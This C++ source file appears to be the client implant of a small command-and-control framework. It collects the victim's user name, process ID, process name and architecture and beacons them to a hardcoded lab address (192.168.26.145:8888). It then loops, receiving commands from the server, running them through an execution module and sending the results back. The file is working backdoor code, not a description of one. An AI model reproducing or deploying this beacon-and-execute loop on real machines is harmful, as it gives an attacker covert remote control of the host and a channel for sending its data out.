// Client code 
#include <C2PlusPlus\IncludeMe.h>
#include <iostream>
#include <Client\Metadata.h>

using namespace C2PlusPlus;

int main()
{
	/*Client::Metadata metadata;
	std::string username = metadata.GetCurrentUserName();
	std::cout << "Username: " << username << std::endl;*/

	std::vector<Client::Metadata> clientList;

	Client::Metadata metadata;
	std::cout << "ID: " << metadata.id << std::endl;
	std::cout << "Username: " << metadata.username << std::endl; 
	std::cout << "Proccess ID: " << metadata.processId << std::endl;
	std::cout << "Proccess Name: " << metadata.processName << std::endl;
	std::cout << "Proccess x86: " << metadata.is64 << std::endl;

	Client::Metadata metadata2;

	clientList.push_back(metadata);
	clientList.push_back(metadata2);

	if (clientList.empty())
		std::cout << "The List is Empty" << std::endl;
	else
	{
		std::cout << "The List has " << std::to_string(clientList.size()) << " object" << std::endl;
		
		Client::Metadata client, client2;
		client = clientList.front();
		client2 = clientList.back();

		std::cout << client.id << std::endl;
		std::cout << client2.id << std::endl << std::endl;

		std::cout << clientList[0].id << std::endl;
		std::cout << clientList[1].id << std::endl;
	}

	/*while (true)
	{
		Module module;
		std::string command = "";

		std::cout << "> ";
		std::getline(std::cin, command);

		std::cout << module.Execute(command) << std::endl;

		if (command == "exit")
			break;
	}*/
	

	
	if (Network::Initialize())
	{
		std::cout << "Winsock api successfully initialized." << std::endl;
		Socket socket;

		if (socket.Create() == PResult::P_Success)
		{
			std::cout << "Socket successfully created." << std::endl;
			if (socket.Connect(IPEndpoint("192.168.26.145", 8888)) == PResult::P_Success)
			{
				Client::Metadata metadata;
				Module module;

				int firstContact = 1;

				while (true)
				{
					std::string buffer = "";
					

					if (!firstContact)
					{
						// receive information from Server and execute:
						// std::cout << "Waiting command to be executed..." << std::endl;
						uint32_t bufferSize = 0;
						int result = socket.RecvAll(&bufferSize, sizeof(uint32_t));
						if (result != PResult::P_Success)
							break;

						bufferSize = ntohl(bufferSize);

						//if (bufferSize > g_MaxPacketSize)
						//	break;

						buffer.resize(bufferSize);
						result = socket.RecvAll(&buffer[0], bufferSize);
						if (result != PResult::P_Success)
							break;


						// Search & Execute Module 
						buffer = module.Execute(buffer);




					}
					else
					{
						buffer = metadata.id + " " + metadata.username + " " + std::to_string(metadata.processId)
							+ " " + metadata.processName + " " + std::to_string(metadata.is64);
						
						firstContact = 0;
					}

					// RESPONSE TO SERVER 

					uint32_t bufferSize = buffer.size();
					bufferSize = htonl(bufferSize);
					int result = socket.SendAll(&bufferSize, sizeof(uint32_t));
					if (result != PResult::P_Success)
						break;

					result = socket.SendAll(buffer.data(), buffer.size());
					if (result != PResult::P_Success)
						break;

					//std::cout << "Attempting to send chunk of data..." << std::endl;
					Sleep(1000);
				}
			}
			else
			{
				std::cerr << "Failed to connect to server." << std::endl;
			}
			socket.Close();
		}
		else
		{
			std::cerr << "Socket failed to create." << std::endl;
		}
	}
	Network::Shutdown();
	system("pause");
	return 0;
}